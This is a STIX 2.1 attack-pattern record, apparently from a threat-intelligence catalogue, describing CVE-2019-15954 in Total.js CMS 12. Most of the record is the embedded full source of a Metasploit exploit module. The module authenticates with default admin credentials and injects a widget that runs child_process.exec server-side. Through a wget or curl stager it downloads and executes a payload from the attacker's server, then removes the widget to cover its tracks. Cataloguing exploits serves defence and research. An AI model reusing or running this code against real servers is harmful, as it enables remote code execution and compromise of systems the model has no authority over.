{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59b75024-d836-474a-b009-e5671d781994",
    "created": "2024-08-14T17:09:58.14126Z",
    "modified": "2024-08-14T17:09:58.141264Z",
    "name": "Total.js CMS 12 Widget JavaScript Code Injection",
    "description": " This module exploits a vulnerability in Total.js CMS. The issue is that a user with admin permission can embed a malicious JavaScript payload in a widget, which is evaluated server side, and gain remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/totaljs_cms_widget_exec.rb",
            "external_id": "totaljs_cms_widget_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-15954"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Sep/5"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Total.js CMS 12 Widget JavaScript Code Injection',\n      'Description'    => %q{\n        This module exploits a vulnerability in Total.js CMS. The issue is that a user with\n        admin permission can embed a malicious JavaScript payload in a widget, which is\n        evaluated server side, and gain remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Riccardo Krauter', # Original discovery\n          'sinn3r'            # Metasploit module\n        ],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          [ 'Total.js CMS on Linux', { 'Platform' => 'linux', 'CmdStagerFlavor' => 'wget'} ],\n          [ 'Total.js CMS on Mac',   { 'Platform' => 'osx', 'CmdStagerFlavor' => 'curl' } ]\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-15954'],\n          ['URL', 'https://seclists.org/fulldisclosure/2019/Sep/5'],\n          ['URL', 'https://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf']\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8000,\n        },\n      'Notes'          =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-08-30', # Reported to seclist\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path for Total.js CMS', '/']),\n        OptString.new('TOTALJSUSERNAME', [true, 'The username for Total.js admin', 'admin']),\n        OptString.new('TOTALJSPASSWORD', [true, 'The password for Total.js admin', 'admin'])\n      ])\n  end\n\n  class AdminToken\n    attr_reader :token\n\n    def initialize(cookie)\n      @token = cookie.scan(/__admin=([a-zA-Z\\d]+);/).flatten.first\n    end\n\n    def blank?\n      token.blank?\n    end\n  end\n\n  class Widget\n    attr_reader :name\n    attr_reader :category\n    attr_reader :source_code\n    attr_reader :platform\n    attr_reader :url\n\n    def initialize(p, u, stager)\n      @name = \"p_#{Rex::Text.rand_text_alpha(10)}\"\n      @category = 'content'\n      @platform = p\n      @url = u\n      @source_code  = %Q|<script total>|\n      @source_code << %Q|global.process.mainModule.require('child_process')|\n      @source_code << %Q|.exec(\"sleep 2;#{stager}\");|\n      @source_code << %Q|</script>|\n    end\n  end\n\n  def check\n    code = CheckCode::Safe\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'widgets')\n    })\n\n    unless res\n      vprint_error('Connection timed out')\n      return CheckCode::Unknown\n    end\n\n    # If the admin's login page is visited too many times, we will start getting\n    # a 401 (unauthorized response). In that case, we only have a header to work\n    # with.\n    if res.headers['X-Powered-By'].to_s == 'Total.js'\n      code = CheckCode::Detected\n    end\n\n    # If we are here, then that means we can still see the login page.\n    # Let's see if we can extract a version.\n    html = res.get_html_document\n    element = html.at('title')\n    return code unless element.respond_to?(:text)\n    title = element.text.scan(/CMS v([\\d\\.]+)/).flatten.first\n    return code unless title\n    version = Rex::Version.new(title)\n\n    if version <= Rex::Version.new('12')\n      # If we are able to check the version, we could try the default cred and attempt\n      # to execute malicious code and see how the application responds. However, this\n      # seems to a bit too aggressive so I'll leave that to the exploit part.\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def auth(user, pass)\n    json_body = { 'name' => user, 'password' => pass }.to_json\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'api', 'login', 'admin'),\n      'ctype'  => 'application/json',\n      'data'   => json_body\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    json_res = res.get_json_document\n    cookies = res.get_cookies\n    # If it's an array it could be an error, so we are specifically looking for a hash.\n    if json_res.kind_of?(Hash) && json_res['success']\n      token = AdminToken.new(cookies)\n      @admin_token = token\n      return token\n    end\n    fail_with(Failure::NoAccess, 'Invalid username or password')\n  end\n\n  def create_widget(admin_token)\n    platform = target.platform.names.first\n    host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket::source_address : datastore['SRVHOST']\n    port = datastore['SRVPORT']\n    proto = datastore['SSL'] ? 'https' : 'http'\n    payload_name = \"p_#{Rex::Text.rand_text_alpha(5)}\"\n    url = \"#{proto}://#{host}:#{port}#{get_resource}/#{payload_name}\"\n    widget = Widget.new(platform, url, generate_cmdstager(\n        'Path' => \"#{get_resource}/#{payload_name}\",\n        'temp' => '/tmp',\n        'file' => payload_name\n      ).join(';'))\n\n    json_body = {\n      'name'     => widget.name,\n      'category' => widget.category,\n      'body'     => widget.source_code\n    }.to_json\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'api', 'widgets'),\n      'cookie' => \"__admin=#{admin_token.token}\",\n      'ctype'  => 'application/json',\n      'data'   => json_body\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    res_json = res.get_json_document\n    if res_json.kind_of?(Hash) && res_json['success']\n      print_good(\"Widget created successfully\")\n    else\n      fail_with(Failure::Unknown, 'No success message in body')\n    end\n\n    widget\n  end\n\n  def get_widget_item(admin_token, widget)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'api', 'widgets'),\n      'cookie' => \"__admin=#{admin_token.token}\",\n      'ctype'  => 'application/json'\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    res_json = res.get_json_document\n    count = res_json['count']\n    items = res_json['items']\n\n    unless count\n      fail_with(Failure::Unknown, 'No count key found in body')\n    end\n\n    unless items\n      fail_with(Failure::Unknown, 'No items key found in body')\n    end\n\n    items.each do |item|\n      widget_name = item['name']\n      if widget_name.match(/p_/)\n        return item\n      end\n    end\n\n    []\n  end\n\n  def clear_widget\n    admin_token = get_admin_token\n    widget = get_widget\n\n    print_status('Finding the payload from the widget list...')\n    item = get_widget_item(admin_token, widget)\n\n    json_body = {\n      'id'          => item['id'],\n      'picture'     => item['picture'],\n      'name'        => item['name'],\n      'icon'        => item['icon'],\n      'category'    => item['category'],\n      'datecreated' => item['datecreated'],\n      'reference'   => item['reference']\n    }.to_json\n\n    res = send_request_cgi({\n      'method' => 'DELETE',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'api', 'widgets'),\n      'cookie' => \"__admin=#{admin_token.token}\",\n      'ctype'  => 'application/json',\n      'data'   => json_body\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    res_json = res.get_json_document\n    if res_json.kind_of?(Hash) && res_json['success']\n      print_good(\"Widget cleared successfully\")\n    else\n      fail_with(Failure::Unknown, 'No success message in body')\n    end\n  end\n\n  def on_request_uri(cli, req)\n    print_status(\"#{cli.peerhost} requesting: #{req.uri}\")\n\n    if req.uri =~ /p_.+/\n      payload_exe = generate_payload_exe(code: payload.encoded)\n      print_status(\"Sending payload to #{cli.peerhost}\")\n      send_response(cli, payload_exe, {'Content-Type' => 'application/octet-stream'})\n      return\n    end\n\n    send_not_found(cli)\n  end\n\n  def on_new_session(session)\n    clear_widget\n  end\n\n  # This is kind of for cleaning up the wiget, because we cannot pass it as an\n  # argument in on_new_session.\n  def get_widget\n    @widget\n  end\n\n  # This is also kind of for cleaning up widget, because we cannot pass it as an\n  # argument directly\n  def get_admin_token\n    @admin_token\n  end\n\n  def exploit\n    user = datastore['TOTALJSUSERNAME']\n    pass = datastore['TOTALJSPASSWORD']\n    print_status(\"Attempting to authenticate with #{user}:#{pass}\")\n    admin_token = auth(user, pass)\n    fail_with(Failure::Unknown, 'No admin token found') if admin_token.blank?\n    print_good(\"Authenticatd as: #{user}:#{pass}\")\n    print_status(\"Creating a widget...\")\n    @widget = create_widget(admin_token)\n    super\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-08-30, # Reported to seclist"
}